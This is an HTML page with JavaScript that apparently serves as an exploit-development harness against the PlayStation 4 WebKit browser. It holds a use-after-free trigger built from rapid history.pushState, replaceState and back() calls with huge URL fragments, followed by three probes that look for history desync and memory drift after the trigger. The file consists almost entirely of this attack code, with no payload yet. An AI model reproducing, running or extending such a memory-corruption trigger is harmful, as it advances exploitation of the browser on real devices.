<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – UAF Post-Trigger G Tests</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
button { font-size:16px; margin:10px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>

<h2>PS4 WebKit – UAF Post-Trigger Integrity Tests (G1–G3)</h2>
<button onclick="runAll()">RUN G TESTS</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
const sleep = ms => new Promise(r=>setTimeout(r,ms));

/* ------------------------------
   UAF TRIGGER (SINGLE EXECUTION)
------------------------------- */
async function triggerUAF(){
    log("=== UAF TRIGGER START ===");

    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({i}, "", "#"+frag);
        history.replaceState({i}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] back() async`);
        }
        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

/* ------------------------------
   G1 — HISTORY ENTRY INTEGRITY
------------------------------- */
async function testG1(){
    log("\n=== G1 START: History Entry Integrity ===");

    let base = history.length;
    log(`[G1] history.length initial = ${base}`);

    for(let i=0;i<8;i++){
        history.pushState({g1:i}, "", "#G1_"+i);
        await sleep(2);
    }

    log(`[G1] history.length after push = ${history.length}`);
    log(`[G1] history.state = ${JSON.stringify(history.state)}`);

    log("=== G1 END ===");
}

/* ------------------------------
   G2 — FRAGMENT / ENTRY DESYNC
------------------------------- */
async function testG2(){
    log("\n=== G2 START: Fragment <-> Entry Desync ===");

    let big = "B".repeat(120000);
    location.hash = big;
    await sleep(20);

    let before = document.URL.length;
    log(`[G2] URL.length before = ${before}`);

    history.replaceState({x:1}, "", "#x");
    await sleep(10);

    let after = document.URL.length;
    log(`[G2] URL.length after = ${after}`);
    log(`[G2] history.state = ${JSON.stringify(history.state)}`);

    log(
        after !== before
        ? "[G2] URL length updated normally"
        : "[G2] DESYNC DETECTED"
    );

    log("=== G2 END ===");
}

/* ------------------------------
   G3 — TEMPORAL REUSE PROBE
------------------------------- */
async function testG3(){
    log("\n=== G3 START: Temporal Reuse Probe ===");

    let snapshot = [];
    for(let i=0;i<5;i++){
        snapshot.push({
            len: document.URL.length,
            c64: document.URL.charCodeAt(64),
            c256: document.URL.charCodeAt(256)
        });
        await sleep(5);
    }

    snapshot.forEach((s,i)=>{
        log(`[G3][${i}] len=${s.len} c64=${s.c64} c256=${s.c256}`);
    });

    let stable = snapshot.every(
        s => s.len === snapshot[0].len &&
             s.c64 === snapshot[0].c64 &&
             s.c256 === snapshot[0].c256
    );

    log(
        stable
        ? "[G3] Stable reuse (no temporal drift)"
        : "[G3] TEMPORAL MEMORY DRIFT DETECTED"
    );

    log("=== G3 END ===");
}

/* ------------------------------
   MASTER SEQUENCE
------------------------------- */
async function runAll(){
    logEl.textContent = "";
    await triggerUAF();
    await testG1();
    await testG2();
    await testG3();
    log("\n=== ALL G TESTS COMPLETE ===");
}
</script>

</body>
</html>

